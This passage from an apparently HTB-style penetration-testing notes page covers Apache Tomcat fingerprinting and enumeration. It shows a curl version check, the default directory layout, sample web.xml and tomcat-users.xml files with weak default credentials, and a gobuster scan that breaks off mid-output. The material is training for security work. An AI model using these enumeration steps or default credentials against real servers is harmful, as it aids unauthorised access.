<li class=md-nav__item> <a href=../../attacking_web_applications/idor/ class=md-nav__link> Insecure Direct Object References </a> </li> <li class=md-nav__item> <a href=../../attacking_web_applications/xxe/ class=md-nav__link> XML External Entity (XXE) Injection </a> </li> <li class=md-nav__item> <a href=../../attacking_web_applications/sql_injection/ class=md-nav__link> SQLi </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_2_3_9 type=checkbox id=__nav_2_3_9> <label class=md-nav__link for=__nav_2_3_9> Server Side Atks <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="Server Side Atks" data-md-level=3> <label class=md-nav__title for=__nav_2_3_9> <span class="md-nav__icon md-icon"></span> Server Side Atks </label> <ul class=md-nav__list data-md-scrollfix> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_2_3_9_1 type=checkbox id=__nav_2_3_9_1> <label class=md-nav__link for=__nav_2_3_9_1> SSRF <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=SSRF data-md-level=4> <label class=md-nav__title for=__nav_2_3_9_1> <span class="md-nav__icon md-icon"></span> SSRF </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../server_side_attacks/ssrf/ class=md-nav__link> SSRF Example </a> </li> <li class=md-nav__item> <a href=../../server_side_attacks/blind_ssrf/ class=md-nav__link> Blind SSRF Example </a> </li> <li class=md-nav__item> <a href=../../server_side_attacks/time_based_ssrf/ class=md-nav__link> Time-Based SSRF </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_2_3_9_2 type=checkbox id=__nav_2_3_9_2> <label class=md-nav__link for=__nav_2_3_9_2> SSI <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=SSI data-md-level=4> <label class=md-nav__title for=__nav_2_3_9_2> <span class="md-nav__icon md-icon"></span> SSI </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../server_side_attacks/ssi_overview/ class=md-nav__link> Overview </a> </li> <li class=md-nav__item> <a href=../../server_side_attacks/ssi_example/ class=md-nav__link> Example </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_2_3_9_3 type=checkbox id=__nav_2_3_9_3> <label class=md-nav__link for=__nav_2_3_9_3> ESI <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=ESI data-md-level=4> <label class=md-nav__title for=__nav_2_3_9_3> <span class="md-nav__icon md-icon"></span> ESI </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../server_side_attacks/esi_overview/ class=md-nav__link> Overview </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_2_3_9_4 type=checkbox id=__nav_2_3_9_4> <label class=md-nav__link for=__nav_2_3_9_4> SSTI <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=SSTI data-md-level=4> <label class=md-nav__title for=__nav_2_3_9_4> <span class="md-nav__icon md-icon"></span> SSTI </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../server_side_attacks/ssti_intro/ class=md-nav__link> Intro </a> </li> <li class=md-nav__item> <a href=../../server_side_attacks/ssti_example1/ class=md-nav__link> SSTI Example1 </a> </li> <li class=md-nav__item> <a href=../../server_side_attacks/ssti_example2/ class=md-nav__link> SSTI Example2 </a> </li> <li class=md-nav__item> <a href=../../server_side_attacks/ssti_example3/ class=md-nav__link> SSTI Example3 </a> </li> </ul> </nav> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_2_3_10 type=checkbox id=__nav_2_3_10> <label class=md-nav__link for=__nav_2_3_10> File Inclusion <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="File Inclusion" data-md-level=3> <label class=md-nav__title for=__nav_2_3_10> <span class="md-nav__icon md-icon"></span> File Inclusion </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../file_inclusion/intro/ class=md-nav__link> Introduction </a> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_2_3_10_2 type=checkbox id=__nav_2_3_10_2> <label class=md-nav__link for=__nav_2_3_10_2> LFI <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=LFI data-md-level=4> <label class=md-nav__title for=__nav_2_3_10_2> <span class="md-nav__icon md-icon"></span> LFI </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../file_inclusion/lfi/ class=md-nav__link> LFI </a> </li> <li class=md-nav__item> <a href=../../file_inclusion/lfi_to_rce/ class=md-nav__link> LFI to RCE </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_2_3_10_3 type=checkbox id=__nav_2_3_10_3> <label class=md-nav__link for=__nav_2_3_10_3> Other Techniques <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="Other Techniques" data-md-level=4> <label class=md-nav__title for=__nav_2_3_10_3> <span class="md-nav__icon md-icon"></span> Other Techniques </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../file_inclusion/other_php_wrappers/ class=md-nav__link> PHP Wrappers </a> </li> <li class=md-nav__item> <a href=../../file_inclusion/remote_file_inclusion/ class=md-nav__link> RFI </a> </li> </ul> </nav> </li> <li class=md-nav__item> <a href=../../file_inclusion/hardening_tips/ class=md-nav__link> Hardening Tips </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_2_3_11 type=checkbox id=__nav_2_3_11> <label class=md-nav__link for=__nav_2_3_11> Shells&Payloads <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=Shells&amp;Payloads data-md-level=3> <label class=md-nav__title for=__nav_2_3_11> <span class="md-nav__icon md-icon"></span> Shells&Payloads </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../shells_payloads/msfvenom/ class=md-nav__link> MSFvenom </a> </li> <li class=md-nav__item> <a href=../../shells_payloads/windows_shells/ class=md-nav__link> Windows Shells </a> </li> <li class=md-nav__item> <a href=../../shells_payloads/unix_linux/ class=md-nav__link> NIX Shells </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_2_3_12 type=checkbox id=__nav_2_3_12> <label class=md-nav__link for=__nav_2_3_12> Tools <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=Tools data-md-level=3> <label class=md-nav__title for=__nav_2_3_12> <span class="md-nav__icon md-icon"></span> Tools </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../tools/nmap/ class=md-nav__link> Nmap </a> </li> <li class=md-nav__item> <a href=../../tools/ffuf/ class=md-nav__link> Ffuf </a> </li> </ul> </nav> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--section md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_2_4 type=checkbox id=__nav_2_4> <label class=md-nav__link for=__nav_2_4> Blue Team <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="Blue Team" data-md-level=2> <label class=md-nav__title for=__nav_2_4> <span class="md-nav__icon md-icon"></span> Blue Team </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../file_analysis/useful_links/ class=md-nav__link> File Analysis </a> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_2_4_2 type=checkbox id=__nav_2_4_2> <label class=md-nav__link for=__nav_2_4_2> Network Traffic Analysis <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="Network Traffic Analysis" data-md-level=3> <label class=md-nav__title for=__nav_2_4_2> <span class="md-nav__icon md-icon"></span> Network Traffic Analysis </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../network_traffic_analysis/layers/ class=md-nav__link> Layers </a> </li> <li class=md-nav__item> <a href=../../network_traffic_analysis/analysis/ class=md-nav__link> Analysis </a> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_2_4_2_3 type=checkbox id=__nav_2_4_2_3> <label class=md-nav__link for=__nav_2_4_2_3> Tcpdump <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=Tcpdump data-md-level=4> <label class=md-nav__title for=__nav_2_4_2_3> <span class="md-nav__icon md-icon"></span> Tcpdump </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../network_traffic_analysis/tcpdump_fundamentals/ class=md-nav__link> Fundamentals </a> </li> <li class=md-nav__item> <a href=../../network_traffic_analysis/tcpdump_packet_filtering/ class=md-nav__link> Packet Filtering </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_2_4_2_4 type=checkbox id=__nav_2_4_2_4> <label class=md-nav__link for=__nav_2_4_2_4> Wireshark <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=Wireshark data-md-level=4> <label class=md-nav__title for=__nav_2_4_2_4> <span class="md-nav__icon md-icon"></span> Wireshark </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../network_traffic_analysis/wireshark_analysis/ class=md-nav__link> Analysis </a> </li> <li class=md-nav__item> <a href=../../network_traffic_analysis/wireshark_advanced_usage/ class=md-nav__link> Advanced Usage </a> </li> </ul> </nav> </li> </ul> </nav> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--section md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_2_5 type=checkbox id=__nav_2_5> <label class=md-nav__link for=__nav_2_5> Resources <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=Resources data-md-level=2> <label class=md-nav__title for=__nav_2_5> <span class="md-nav__icon md-icon"></span> Resources </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../useful_resources/links/ class=md-nav__link> Useful Links </a> </li> </ul> </nav> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_3 type=checkbox id=__nav_3> <div class="md-nav__link md-nav__link--index "> <a href=../../blog/ >Blog</a> <label for=__nav_3> <span class="md-nav__icon md-icon"></span> </label> </div> <nav class=md-nav aria-label=Blog data-md-level=1> <label class=md-nav__title for=__nav_3> <span class="md-nav__icon md-icon"></span> Blog </label> <ul class=md-nav__list data-md-scrollfix> <li class="md-nav__item md-nav__item--section md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_3_2 type=checkbox id=__nav_3_2> <label class=md-nav__link for=__nav_3_2> 2022 <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=2022 data-md-level=2> <label class=md-nav__title for=__nav_3_2> <span class="md-nav__icon md-icon"></span> 2022 </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../blog/2022/lets_connect/ class=md-nav__link> Lets Connect </a> </li> </ul> </nav> </li> </ul> </nav> </li> </ul> </nav> </div> </div> </div> <div class="md-sidebar md-sidebar--secondary" data-md-component=sidebar data-md-type=toc> <div class=md-sidebar__scrollwrap> <div class=md-sidebar__inner> <nav class="md-nav md-nav--secondary" aria-label="Table of contents"> <label class=md-nav__title for=__toc> <span class="md-nav__icon md-icon"></span> Table of contents </label> <ul class=md-nav__list data-md-component=toc data-md-scrollfix> <li class=md-nav__item> <a href=#discoveryfootprint class=md-nav__link> Discovery/Footprint </a> </li> <li class=md-nav__item> <a href=#enumeration class=md-nav__link> Enumeration </a> </li> <li class=md-nav__item> <a href=#attacking-tomcat class=md-nav__link> Attacking Tomcat </a> </li> <li class=md-nav__item> <a href=#tomcat-manager-login-brute-force class=md-nav__link> Tomcat Manager - Login Brute Force </a> </li> <li class=md-nav__item> <a href=#tomcat-manager-war-file-upload class=md-nav__link> Tomcat Manager - WAR File Upload </a> </li> <li class=md-nav__item> <a href=#cve-2020-1938-ghostcat class=md-nav__link> CVE-2020-1938 : Ghostcat </a> </li> </ul> </nav> </div> </div> </div> <div class=md-content data-md-component=content> <article class="md-content__inner md-typeset"> <h1 id=tomcat-discovery-enumeration>Tomcat Discovery &amp; Enumeration<a class=headerlink href=#tomcat-discovery-enumeration title="Permanent link">&para;</a></h1> <p><a href=https://tomcat.apache.org/ >Apache Tomcat</a> is an open-source web server that hosts applications written in Java.</p> <hr> <h2 id=discoveryfootprint>Discovery/Footprint<a class=headerlink href=#discoveryfootprint title="Permanent link">&para;</a></h2> <p>Tomcat servers can be identified by the Server header in the HTTP response.</p> <div class=highlight><pre><span></span><code><a id=__codelineno-0-1 name=__codelineno-0-1 href=#__codelineno-0-1></a><span class=gp>hrmns@htb[/htb]$ </span>curl -s http://app-dev.inlanefreight.local:8080/docs/ <span class=p>|</span> grep Tomcat 
<a id=__codelineno-0-2 name=__codelineno-0-2 href=#__codelineno-0-2></a>
<a id=__codelineno-0-3 name=__codelineno-0-3 href=#__codelineno-0-3></a><span class=go>&lt;html lang=&quot;en&quot;&gt;&lt;head&gt;&lt;META http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=UTF-8&quot;&gt;&lt;link href=&quot;./images/docs-stylesheet.css&quot; rel=&quot;stylesheet&quot; type=&quot;text/css&quot;&gt;&lt;title&gt;Apache Tomcat 9 (9.0.30) - Documentation Index&lt;/title&gt;&lt;meta name=&quot;author&quot; </span>
<a id=__codelineno-0-4 name=__codelineno-0-4 href=#__codelineno-0-4></a>
<a id=__codelineno-0-5 name=__codelineno-0-5 href=#__codelineno-0-5></a><span class=go>&lt;SNIP&gt;</span>
</code></pre></div> <p>This is the default documentation page, which may not be removed by administrators. General folder structure of a Tomcat installation.</p> <div class=highlight><pre><span></span><code><a id=__codelineno-1-1 name=__codelineno-1-1 href=#__codelineno-1-1></a><span class=go>├── bin</span>
<a id=__codelineno-1-2 name=__codelineno-1-2 href=#__codelineno-1-2></a><span class=go>├── conf</span>
<a id=__codelineno-1-3 name=__codelineno-1-3 href=#__codelineno-1-3></a><span class=go>│   ├── catalina.policy</span>
<a id=__codelineno-1-4 name=__codelineno-1-4 href=#__codelineno-1-4></a><span class=go>│   ├── catalina.properties</span>
<a id=__codelineno-1-5 name=__codelineno-1-5 href=#__codelineno-1-5></a><span class=go>│   ├── context.xml</span>
<a id=__codelineno-1-6 name=__codelineno-1-6 href=#__codelineno-1-6></a><span class=go>│   ├── tomcat-users.xml</span>
<a id=__codelineno-1-7 name=__codelineno-1-7 href=#__codelineno-1-7></a><span class=go>│   ├── tomcat-users.xsd</span>
<a id=__codelineno-1-8 name=__codelineno-1-8 href=#__codelineno-1-8></a><span class=go>│   └── web.xml</span>
<a id=__codelineno-1-9 name=__codelineno-1-9 href=#__codelineno-1-9></a><span class=go>├── lib</span>
<a id=__codelineno-1-10 name=__codelineno-1-10 href=#__codelineno-1-10></a><span class=go>├── logs</span>
<a id=__codelineno-1-11 name=__codelineno-1-11 href=#__codelineno-1-11></a><span class=go>├── temp</span>
<a id=__codelineno-1-12 name=__codelineno-1-12 href=#__codelineno-1-12></a><span class=go>├── webapps</span>
<a id=__codelineno-1-13 name=__codelineno-1-13 href=#__codelineno-1-13></a><span class=go>│   ├── manager</span>
<a id=__codelineno-1-14 name=__codelineno-1-14 href=#__codelineno-1-14></a><span class=go>│   │   ├── images</span>
<a id=__codelineno-1-15 name=__codelineno-1-15 href=#__codelineno-1-15></a><span class=go>│   │   ├── META-INF</span>
<a id=__codelineno-1-16 name=__codelineno-1-16 href=#__codelineno-1-16></a><span class=go>│   │   └── WEB-INF</span>
<a id=__codelineno-1-17 name=__codelineno-1-17 href=#__codelineno-1-17></a><span class=go>|   |       └── web.xml</span>
<a id=__codelineno-1-18 name=__codelineno-1-18 href=#__codelineno-1-18></a><span class=go>│   └── ROOT</span>
<a id=__codelineno-1-19 name=__codelineno-1-19 href=#__codelineno-1-19></a><span class=go>│       └── WEB-INF</span>
<a id=__codelineno-1-20 name=__codelineno-1-20 href=#__codelineno-1-20></a><span class=go>└── work</span>
<a id=__codelineno-1-21 name=__codelineno-1-21 href=#__codelineno-1-21></a><span class=go>    └── Catalina</span>
<a id=__codelineno-1-22 name=__codelineno-1-22 href=#__codelineno-1-22></a><span class=go>        └── localhost</span>
</code></pre></div> <p>The <strong>bin</strong> folder stores scripts and binaries needed to start and run a Tomcat server. The <strong>conf</strong> folder stores various configuration files used by Tomcat. The <strong>tomcat-users.xml</strong> file stores user credentials and their assigned roles. The <strong>lib</strong> folder holds the various JAR files needed for the correct functioning of Tomcat. The <strong>logs</strong> and <strong>temp</strong> folders store temporary log files. The <strong>webapps</strong> folder is the default webroot of Tomcat and hosts all the applications. The <strong>work</strong> folder acts as a cache and is used to store data during runtime.</p> <p>Each folder inside <strong>webapps</strong> is expected to have the following structure.</p> <div class=highlight><pre><span></span><code><a id=__codelineno-2-1 name=__codelineno-2-1 href=#__codelineno-2-1></a><span class=go>webapps/customapp</span>
<a id=__codelineno-2-2 name=__codelineno-2-2 href=#__codelineno-2-2></a><span class=go>├── images</span>
<a id=__codelineno-2-3 name=__codelineno-2-3 href=#__codelineno-2-3></a><span class=go>├── index.jsp</span>
<a id=__codelineno-2-4 name=__codelineno-2-4 href=#__codelineno-2-4></a><span class=go>├── META-INF</span>
<a id=__codelineno-2-5 name=__codelineno-2-5 href=#__codelineno-2-5></a><span class=go>│   └── context.xml</span>
<a id=__codelineno-2-6 name=__codelineno-2-6 href=#__codelineno-2-6></a><span class=go>├── status.xsd</span>
<a id=__codelineno-2-7 name=__codelineno-2-7 href=#__codelineno-2-7></a><span class=go>└── WEB-INF</span>
<a id=__codelineno-2-8 name=__codelineno-2-8 href=#__codelineno-2-8></a><span class=go>    ├── jsp</span>
<a id=__codelineno-2-9 name=__codelineno-2-9 href=#__codelineno-2-9></a><span class=go>    |   └── admin.jsp</span>
<a id=__codelineno-2-10 name=__codelineno-2-10 href=#__codelineno-2-10></a><span class=go>    └── web.xml</span>
<a id=__codelineno-2-11 name=__codelineno-2-11 href=#__codelineno-2-11></a><span class=go>    └── lib</span>
<a id=__codelineno-2-12 name=__codelineno-2-12 href=#__codelineno-2-12></a><span class=go>    |    └── jdbc_drivers.jar</span>
<a id=__codelineno-2-13 name=__codelineno-2-13 href=#__codelineno-2-13></a><span class=go>    └── classes</span>
<a id=__codelineno-2-14 name=__codelineno-2-14 href=#__codelineno-2-14></a><span class=go>        └── AdminServlet.class   </span>
</code></pre></div> <p>The most important file among these is <strong>WEB-INF/web.xml</strong>, which is known as the deployment descriptor. This file stores information about the routes used by the application and the classes handling these routes. All compiled classes used by the application should be stored in the <strong>WEB-INF/classes</strong> folder. These classes might contain important business logic as well as sensitive information. Any vulnerability in these files can lead to total compromise of the website.</p> <p>example web.xml file.</p> <div class=highlight><pre><span></span><code><a id=__codelineno-3-1 name=__codelineno-3-1 href=#__codelineno-3-1></a><span class=go>&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;</span>
<a id=__codelineno-3-2 name=__codelineno-3-2 href=#__codelineno-3-2></a>
<a id=__codelineno-3-3 name=__codelineno-3-3 href=#__codelineno-3-3></a><span class=go>&lt;!DOCTYPE web-app PUBLIC &quot;-//Sun Microsystems, Inc.//DTD Web Application 2.3//EN&quot; &quot;http://java.sun.com/dtd/web-app_2_3.dtd&quot;&gt;</span>
<a id=__codelineno-3-4 name=__codelineno-3-4 href=#__codelineno-3-4></a>
<a id=__codelineno-3-5 name=__codelineno-3-5 href=#__codelineno-3-5></a><span class=go>&lt;web-app&gt;</span>
<a id=__codelineno-3-6 name=__codelineno-3-6 href=#__codelineno-3-6></a><span class=go>  &lt;servlet&gt;</span>
<a id=__codelineno-3-7 name=__codelineno-3-7 href=#__codelineno-3-7></a><span class=go>    &lt;servlet-name&gt;AdminServlet&lt;/servlet-name&gt;</span>
<a id=__codelineno-3-8 name=__codelineno-3-8 href=#__codelineno-3-8></a><span class=go>    &lt;servlet-class&gt;com.inlanefreight.api.AdminServlet&lt;/servlet-class&gt;</span>
<a id=__codelineno-3-9 name=__codelineno-3-9 href=#__codelineno-3-9></a><span class=go>  &lt;/servlet&gt;</span>
<a id=__codelineno-3-10 name=__codelineno-3-10 href=#__codelineno-3-10></a>
<a id=__codelineno-3-11 name=__codelineno-3-11 href=#__codelineno-3-11></a><span class=go>  &lt;servlet-mapping&gt;</span>
<a id=__codelineno-3-12 name=__codelineno-3-12 href=#__codelineno-3-12></a><span class=go>    &lt;servlet-name&gt;AdminServlet&lt;/servlet-name&gt;</span>
<a id=__codelineno-3-13 name=__codelineno-3-13 href=#__codelineno-3-13></a><span class=go>    &lt;url-pattern&gt;/admin&lt;/url-pattern&gt;</span>
<a id=__codelineno-3-14 name=__codelineno-3-14 href=#__codelineno-3-14></a><span class=go>  &lt;/servlet-mapping&gt;</span>
<a id=__codelineno-3-15 name=__codelineno-3-15 href=#__codelineno-3-15></a><span class=go>&lt;/web-app&gt;   </span>
</code></pre></div> <p><strong>web.xml</strong> configuration above defines a new servlet named <strong>AdminServlet</strong> that is mapped to the class <strong>com.inlanefreight.api.AdminServlet</strong>. Next, a new servlet mapping is created to map requests to <strong>/admin</strong> with <strong>AdminServlet</strong>. This configuration will send any request received for <strong>/admin</strong> to the <strong>AdminServlet.class</strong> class for processing. The <strong>web.xml</strong> descriptor holds a lot of sensitive information and is an important file to check when leveraging a Local File Inclusion (LFI) vulnerability.</p> <p>The <strong>tomcat-users.xml</strong> file is used to allow or disallow access to the** /manager** and <strong>host-manager</strong> admin pages.</p> <div class=highlight><pre><span></span><code><a id=__codelineno-4-1 name=__codelineno-4-1 href=#__codelineno-4-1></a><span class=go>&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span>
<a id=__codelineno-4-2 name=__codelineno-4-2 href=#__codelineno-4-2></a>
<a id=__codelineno-4-3 name=__codelineno-4-3 href=#__codelineno-4-3></a><span class=go>&lt;SNIP&gt;</span>
<a id=__codelineno-4-4 name=__codelineno-4-4 href=#__codelineno-4-4></a>
<a id=__codelineno-4-5 name=__codelineno-4-5 href=#__codelineno-4-5></a><span class=go>&lt;tomcat-users xmlns=&quot;http://tomcat.apache.org/xml&quot;</span>
<a id=__codelineno-4-6 name=__codelineno-4-6 href=#__codelineno-4-6></a><span class=go>              xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span>
<a id=__codelineno-4-7 name=__codelineno-4-7 href=#__codelineno-4-7></a><span class=go>              xsi:schemaLocation=&quot;http://tomcat.apache.org/xml tomcat-users.xsd&quot;</span>
<a id=__codelineno-4-8 name=__codelineno-4-8 href=#__codelineno-4-8></a><span class=go>              version=&quot;1.0&quot;&gt;</span>
<a id=__codelineno-4-9 name=__codelineno-4-9 href=#__codelineno-4-9></a><span class=go>&lt;!--</span>
<a id=__codelineno-4-10 name=__codelineno-4-10 href=#__codelineno-4-10></a><span class=go>  By default, no user is included in the &quot;manager-gui&quot; role required</span>
<a id=__codelineno-4-11 name=__codelineno-4-11 href=#__codelineno-4-11></a><span class=go>  to operate the &quot;/manager/html&quot; web application.  If you wish to use this app,</span>
<a id=__codelineno-4-12 name=__codelineno-4-12 href=#__codelineno-4-12></a><span class=go>  you must define such a user - the username and password are arbitrary.</span>
<a id=__codelineno-4-13 name=__codelineno-4-13 href=#__codelineno-4-13></a>
<a id=__codelineno-4-14 name=__codelineno-4-14 href=#__codelineno-4-14></a><span class=go>  Built-in Tomcat manager roles:</span>
<a id=__codelineno-4-15 name=__codelineno-4-15 href=#__codelineno-4-15></a><span class=go>    - manager-gui    - allows access to the HTML GUI and the status pages</span>
<a id=__codelineno-4-16 name=__codelineno-4-16 href=#__codelineno-4-16></a><span class=go>    - manager-script - allows access to the HTTP API and the status pages</span>
<a id=__codelineno-4-17 name=__codelineno-4-17 href=#__codelineno-4-17></a><span class=go>    - manager-jmx    - allows access to the JMX proxy and the status pages</span>
<a id=__codelineno-4-18 name=__codelineno-4-18 href=#__codelineno-4-18></a><span class=go>    - manager-status - allows access to the status pages only</span>
<a id=__codelineno-4-19 name=__codelineno-4-19 href=#__codelineno-4-19></a>
<a id=__codelineno-4-20 name=__codelineno-4-20 href=#__codelineno-4-20></a><span class=go>  The users below are wrapped in a comment and are therefore ignored. If you</span>
<a id=__codelineno-4-21 name=__codelineno-4-21 href=#__codelineno-4-21></a><span class=go>  wish to configure one or more of these users for use with the manager web</span>
<a id=__codelineno-4-22 name=__codelineno-4-22 href=#__codelineno-4-22></a><span class=go>  application, do not forget to remove the &lt;!.. ..&gt; that surrounds them. You</span>
<a id=__codelineno-4-23 name=__codelineno-4-23 href=#__codelineno-4-23></a><span class=go>  will also need to set the passwords to something appropriate.</span>
<a id=__codelineno-4-24 name=__codelineno-4-24 href=#__codelineno-4-24></a><span class=go>--&gt;</span>
<a id=__codelineno-4-25 name=__codelineno-4-25 href=#__codelineno-4-25></a>
<a id=__codelineno-4-26 name=__codelineno-4-26 href=#__codelineno-4-26></a>
<a id=__codelineno-4-27 name=__codelineno-4-27 href=#__codelineno-4-27></a><span class=go> &lt;SNIP&gt;</span>
<a id=__codelineno-4-28 name=__codelineno-4-28 href=#__codelineno-4-28></a>
<a id=__codelineno-4-29 name=__codelineno-4-29 href=#__codelineno-4-29></a><span class=go>!-- user manager can access only manager section --&gt;</span>
<a id=__codelineno-4-30 name=__codelineno-4-30 href=#__codelineno-4-30></a><span class=go>&lt;role rolename=&quot;manager-gui&quot; /&gt;</span>
<a id=__codelineno-4-31 name=__codelineno-4-31 href=#__codelineno-4-31></a><span class=go>&lt;user username=&quot;tomcat&quot; password=&quot;tomcat&quot; roles=&quot;manager-gui&quot; /&gt;</span>
<a id=__codelineno-4-32 name=__codelineno-4-32 href=#__codelineno-4-32></a>
<a id=__codelineno-4-33 name=__codelineno-4-33 href=#__codelineno-4-33></a><span class=go>&lt;!-- user admin can access manager and admin section both --&gt;</span>
<a id=__codelineno-4-34 name=__codelineno-4-34 href=#__codelineno-4-34></a><span class=go>&lt;role rolename=&quot;admin-gui&quot; /&gt;</span>
<a id=__codelineno-4-35 name=__codelineno-4-35 href=#__codelineno-4-35></a><span class=go>&lt;user username=&quot;admin&quot; password=&quot;admin&quot; roles=&quot;manager-gui,admin-gui&quot; /&gt;</span>
<a id=__codelineno-4-36 name=__codelineno-4-36 href=#__codelineno-4-36></a>
<a id=__codelineno-4-37 name=__codelineno-4-37 href=#__codelineno-4-37></a>
<a id=__codelineno-4-38 name=__codelineno-4-38 href=#__codelineno-4-38></a><span class=go>&lt;/tomcat-users&gt;</span>
</code></pre></div> <p>We can see that a user <strong>tomcat</strong> with the password <strong>tomcat</strong> has the <strong>manager-gui</strong> role, and a second weak password <strong>admin</strong> is set for the user account <strong>admin</strong></p> <hr> <h2 id=enumeration>Enumeration<a class=headerlink href=#enumeration title="Permanent link">&para;</a></h2> <p>After fingerprinting the Tomcat instance, unless it has a known vulnerability, we'll typically want to look for the <strong>/manager</strong> and the <strong>/host-manager</strong> pages.</p> <div class=highlight><pre><span></span><code><a id=__codelineno-5-1 name=__codelineno-5-1 href=#__codelineno-5-1></a><span class=gp>hrmns@htb[/htb]$ </span>gobuster dir -u http://web01.inlanefreight.local:8180/ -w /usr/share/dirbuster/wordlists/directory-list-2.3-small.txt 
<a id=__codelineno-5-2 name=__codelineno-5-2 href=#__codelineno-5-2></a>
<a id=__codelineno-5-3 name=__codelineno-5-3 href=#__codelineno-5-3></a><span class=go>===============================================================</span>
<a id=__codelineno-5-4 name=__codelineno-5-4 href=#__codelineno-5-4></a><span class=go>Gobuster v3.0.1</span>
<a id=__codelineno-5-5 name=__codelineno-5-5 href=#__codelineno-5-5></a><span class=go>by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@_FireFart_)</span>
<a id=__codelineno-5-6 name=__codelineno-5-6 href=#__codelineno-5-6></a><span class=go>===============================================================</span>
<a id=__codelineno-5-7 name=__codelineno-5-7 href=#__codelineno-5-7></a><span class=go>[+] Url:            http://web01.inlanefreight.local:8180/</span>
<a id=__codelineno-5-8 name=__codelineno-5-8 href=#__codelineno-5-8></a><span class=go>[+] Threads:        10</span>
<a id=__codelineno-5-9 name=__codelineno-5-9 href=#__codelineno-5-9></a><span class=go>[+] Wordlist:       /usr/share/dirbuster/wordlists/directory-list-2.3-small.txt</span>
<a id=__codelineno-5-10 name=__codelineno-5-10 href=#__codelineno-5-10></a><span class=go>[+] Status codes:   200,204,301,302,307,401,403</span>
<a id=__codelineno-5-11 name=__codelineno-5-11 href=#__codelineno-5-11></a><span class=go>[+] User Agent:     gobuster/3.0.1</span>
<a id=__codelineno-5-12 name=__codelineno-5-12 href=#__codelineno-5-12></a><span class=go>[+] Timeout:        10s</span>
<a id=__codelineno-5-13 name=__codelineno-5-13 href=#__codelineno-5-13></a><span class=go>===============================================================</span>
<a id=__codelineno-5-14 name=__codelineno-5-14 href=#__codelineno-5-14></a><span class=go>2021/09/21 17:34:54 Starting gobuster</span>
<a id=__codelineno-5-15 name=__codelineno-5-15 href=#__codelineno-5-15></a><span class=go>===============================================================</span>
<a id=__codelineno-5-16 name=__codelineno-5-16 href=#__codelineno-5-16></a><span class=go>/docs (Status: 302)</span>
